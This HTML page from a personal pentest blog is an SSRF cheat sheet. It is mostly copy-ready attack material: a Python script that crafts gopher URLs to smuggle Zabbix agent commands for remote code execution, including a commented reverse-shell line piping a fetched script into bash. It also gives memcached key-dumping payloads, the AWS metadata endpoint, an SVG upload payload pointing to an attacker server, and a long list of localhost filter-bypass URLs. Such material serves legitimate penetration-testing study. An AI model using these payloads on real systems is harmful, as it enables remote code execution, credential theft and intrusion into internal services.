<!doctype html>
<html lang="en" class="no-js">
    <head>
        <meta charset="utf-8">
        <title>SSRF</title>
        <link rel="canonical" href="/pentest/">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="/assets/css/main.css">
        <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
        

    </head>

    <body class="layout--single wide">
        <nav class="skip-links">
        <ul>
            <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
            <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
            <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
        </ul>
        </nav>

        <div class="masthead">
            <div class="masthead__inner-wrap">
                <div class="masthead__menu">
                    <nav id="site-nav" class="greedy-nav"> 
                        <a class="site-title" href="/">
                        Rafael's Blog
                        </a>
                        <ul class="visible-links">
                            <li class="masthead__menu-item">
                                <a href="/about">About</a>
                            </li>
                            <li class="masthead__menu-item">
                                <a href="/categories">Categories</a>
                            </li>
                            <li class="masthead__menu-item">
                                <a href="/tags">Tags</a>
                            </li>
                        </ul>
                        <button class="greedy-nav__toggle hidden" type="button">
                            <span class="visually-hidden">Toggle menu</span>
                            <div class="navicon"></div>
                        </button>
                        <ul class="hidden-links hidden"></ul>
                    </nav>
                </div>
            </div>
        </div>
        <div class="initial-content">
            <div id="main" role="main">
                <div class="sidebar sticky">
                    <div itemscope itemtype="https://schema.org/Person">
                        <div class="author__avatar">
                            <img src="/src/img.jpg" alt="rafael" itemprop="image">
                        </div>
                        <div class="author__content">
                            <h3 class="author__name" itemprop="name">Rafael Caria</h3>
                            <div class="author__bio" itemprop="description"></div>
                        </div>
                        <div class="author__urls-wrapper">
                            <button class="btn btn--inverse">Follow</button>
                            <ul class="author__urls social-icons">
                              <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
                                <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
                              </li>
                              <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
                              <li><a href="https://github.com/rafaelcaria" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
                              <li><a href="https://www.linkedin.com/in/rafael-caria-000839182/" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
                            </ul>
                          </div>
                    </div>
                </div>
                <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
                    <div class="page__inner-wrap">
                        <header>
                            <h1 id="page-title" class="page__title p-name" itemprop="headline">
                                <a href="/pentest/ssrf.html" class="u-url" itemprop="url">Server Side Request Forgery (SSRF)</a>
                            </h1>
                            <p class="page__meta">
                                <span class="page__meta-date">
                                    <i class="far fa-calendar-alt" aria-hidden="true"></i>
                                    <time datetime="2021-10-28T17:00:00+02:00">October 28, 2021</time>
                                </span>
                                <span class="page__meta-sep"></span>
                                <span class="page__meta-readtime">
                                    <i class="far fa-clock" aria-hidden="true"></i>
                                    2 minute read
                                </span>
                            </p>
                        </header>
                        <section class="page__content e-content" itemprop="text">
                            <div>
                                <style>
                                    .collapsible {
                                        background-color: rgb(66, 54, 54);
                                        color: white;
                                        cursor: pointer;
                                        padding: 18px;
                                        width: 100%;
                                        border: none;
                                        text-align: left;
                                        outline: none;
                                        font-size: 15px;
                                    }

                                    .active, .collapsible:hover {
                                        background-color: rgb(66, 54, 54);
                                    }

                                    .content {
                                        padding: 0 18px;
                                        display: none;
                                        overflow: hidden;
                                        background-color: #263238;
                                    }
                                    #carbonads {
                                        border: 1px solid black;
                                        border-radius: 7px;
                                        border-spacing: 7px;
                                        display: block;
                                        overflow: hidden;
                                        padding: 1em;
                                        line-height: 1.5;
                                    }
                                    #carbonads span {
                                        position: relative;
                                        display: block;
                                        overflow: hidden;
                                    }
                                    .carbon-img img {
                                        display: block;
                                        float: left;
                                    }
                                    .carbon-text {
                                        display: block;
                                        font-size: .9em;
                                        text-align: end;
                                    }
                                    .carbon-poweredby {
                                        display: block;
                                        font-size: .8em;
                                        float: right;
                                        line-height: 1;
                                        letter-spacing: 1px;
                                        }
                                </style>
                                <br>   
                                <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=rafaelcariagithubio" id="_carbonads_js"></script> 
                                <br>
                            </div>
                            <aside class="sidebar__right ">
                                <nav class="toc">
                                    <header><h4 class="nav__title">
                                        <i class="fas fa-file-alt"></i> Contents</h4></header>
                                        <ul class="toc__menu">
                                            <li><a href="#ssrf"> Server Side Request Forgery (SSRF)</a>
                                                <ul>
                                                    <li><a href="#introduction">Introduction</a></li>
                                                    <li><a href="#zabbix">Zabbix Protocol Smuggling (RCE)</a></li>
                                                    <li><a href="#memcached">Memcached Protocol Smuggling</a></li>
                                                    <li><a href="#aws-metadata">AWS metadata</a></li>
                                                    <li><a href="#profile-picture-upload">Profile Picture Upload</a></li>
                                                    <li><a href="#bypass-restrictions">Bypass Restrictions</a></li>
                                                    <li><a href="#tools">Tools</a>
                                                        <ul>
                                                            <li><a href="#gopherus">Gopherus</a></li>
                                                        </ul>
                                                    </li>
                                                    <li><a href="#conclusion">Conclusion</a></li>
                                                    <li><a href="#references">References</a></li>
                                                </ul>
                                            </li>
                                        </ul>
                                </nav>
                            </aside>
                            <h2 id="ssrf"> Server Side Request Forgery (SSRF)</h2>
                            <h3 id="introduction">What is Server Side Request FOrgery (SSRF)?</h3>
                            <p>
                                Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. In a SSRF attack, the attacker might cause the server to make a connection to internal services, being able to read or execute commands in a given service. 
                            </p>
                            
                            <h2 id="zabbix">Zabbix Protocol Smuggling (RCE)</h2>
                            <a href="https://www.zabbix.com/documentation/5.0/pt/manual/appendix/items/activepassive" target="_blank" >https://www.zabbix.com/documentation/5.0/pt/manual/appendix/items/activepassive</a><br><br>
                            <p>Zabbix Agent (Port-10050)</p>
                            <button type="button" class="collapsible">zabbix-rce.py</button>
                            <div class="content"><br>
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('code1')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="code1">import struct,sys
import urllib.parse

zbx = b"ZBXD\x01"

#Reverse Shell
#cmd = b"system.run[(curl https://reverse-shell.sh/&lt;IP&gt;:&lt;PORT&gt;|bash)]"

#id command
cmd = b"system.run[(id)]"
datalen = struct.pack("&lt;Q",len(cmd)+2)

encode = (urllib.parse.quote_plus(zbx+datalen+cmd).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":"))
encode2 = (urllib.parse.quote_plus(encode))
print ("Url: gopher://localhost:10050/_"+encode2)
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>
                        
                            <hr>
                            <h2 id="memcached">Memcached</h2>
                            <p>Memcached (Port-11211) </p>
                            <p>
                                Dump memcache Items
                                <br>
                                <code>stats items</code>
                            </p>

                            <button type="button" class="collapsible">stats-items.py</button>
                            <div class="content"><br>
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('code2')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="code2">import urllib.parse

cmd = "stats items\r\n\r\nquit\r\n\r\n"
print ("gopher://localhost:11211/_",end="")
print (urllib.parse.quote(urllib.parse.quote(cmd)))
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>
                            <h3>How to Dump Keys?</h3>
                            <p>
                                Keys can be dumped per slabs class using the "stats cachedump" command.
                                <br>
                                <code>stats cachedump &lt;slab class&gt; &lt;number of items to dump&gt;</code>
                            </p>
                            <button type="button" class="collapsible">stats-cachedump.py</button>
                            <div class="content"><br>        
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('code3')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="code3">import urllib.parse

cmd = "stats cachedump 3 10\r\n\r\nquit\r\n\r\n"
print ("gopher://localhost:11211/_",end="")
print (urllib.parse.quote(urllib.parse.quote(cmd)))
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>
                            <p><br>
                                The "cachedump" returns one item per line. The first number in the braces gives the size in bytes, the second the timestamp of the creation. Given the key name you can now also dump its value using <br>
                                <code>get mykey</code>
                            </p>
                            <button type="button" class="collapsible">get-key.py</button>
                            <div class="content"><br>        
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('code4')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="code4">import urllib.parse

cmd = "get mykey\r\n\r\nquit\r\n\r\n"
print ("gopher://localhost:11211/_",end="")
print (urllib.parse.quote(urllib.parse.quote(cmd)))
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>

                            <hr>
                            <h3 id="aws-metadata">AWS metadata</h3>
                            <p>
                                <code>http://169.254.169.254/latest/meta-data/</code>
                            </p>

                            <hr>

                            <h3 id="profile-picture-upload">Profile Picture Upload</h3>
                            <p><a href="https://www.youtube.com/watch?v=HL7k8GldAX4" target="_blank">Demonstration Video</a></p>
                            <button type="button" class="collapsible">file.svg</button>
                            <div class="content"><br>        
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('svg')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="svg">&lt;svg xmlns:svg="http://www.w3.org/2000/svg"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"&gt;
&lt;image height="30" width="30"
xlink:href="https://&lt;YOUR-SERVER&gt;" /&gt;
&lt;/svg&gt;
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>
                            
                            <h2 id="bypass-restrictions">Bypass Restrictions</h2>
                            <p><a href="https://tools.intigriti.io/redirector/" target="_blank">https://tools.intigriti.io/redirector/</a></p>
                            <p>IP-To-Decimal <br><a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
                            <button type="button" class="collapsible">Bypass</button>
                            <div class="content"><br>        
                                <div class="language-bash highlighter-rouge">
                                    <button onclick="copyToClipboard('bypass')" title="Copy To Clipboard" style="border:1px solid rgb(66, 54, 54); background-color: transparent;">
                                        <img src="https://img.icons8.com/material-sharp/24/000000/copy.png"/>
                                    </button>
                                    <div>
                                        <pre class="highlight">
<code id="bypass">## Localhost
http://127.0.0.1
http://127.0.1
http://127.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://0
http://0.0.0.0:80
http://localhost
http://LoCalHoSt
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

## CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

## Decimal bypass
http://2130706433/ = http://127.0.0.1
http://017700000001 = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

## Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20

##Domain FUZZ bypass (from https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt)
http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d={domain}
https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d={domain}
http://{domain}@localhost
http://localhost#{domain}
http://{domain}.localhost
http://localhost/{domain}
http://localhost/?d={domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}
</code>
                                        </pre>
                                    </div>
                                </div>
                            </div>
                            <hr>
                            <h3 id="tools">Tools</h3>
                            <p> GOPHERUS (<a href="https://github.com/tarunkant/Gopherus" target="_blank">https://github.com/tarunkant/Gopherus</a>)</p>
                            
                            <hr>
                            
                            <h3 id="conclusion">Conclusion</h3>
                            <p>That’s all.
                            <br>Thanks for reading.</p><hr>
                            <h3 id="references">References</h3>
                            <a href="https://lzone.de/blog/How-to-Dump-Keys-from-Memcache" target="_blank">https://lzone.de/blog/How-to-Dump-Keys-from-Memcache</a>
                            <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</a>
                        </section>
                        <footer class="page__meta">
                            <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time>January 07, 2022</time></p>
                        </footer>
    
                        <nav class="pagination">
                            <a href="/pentest/" class="pagination--pager" title="Content">Previous</a>
                            <a href="/pentest/" class="pagination--pager" title="Content">Next</a>
                        </nav>
                    </div>
                </article>
            </div>
        </div>

        <div id="footer" class="page__footer">
            <footer>
                <div class="page__footer-follow">
                    <ul class="social-icons"></ul>
                </div>
            </footer>
        </div>    
        <script src="/assets/js/main.min.js"></script>

        <script>
            var coll = document.getElementsByClassName("collapsible");
            var i;
            
            for (i = 0; i < coll.length; i++) {
              coll[i].addEventListener("click", function() {
                this.classList.toggle("active");
                var content = this.nextElementSibling;
                if (content.style.display === "block") {
                  content.style.display = "none";
                } else {
                  content.style.display = "block";
                }
              });
            }
        </script>
    </body>
</html>
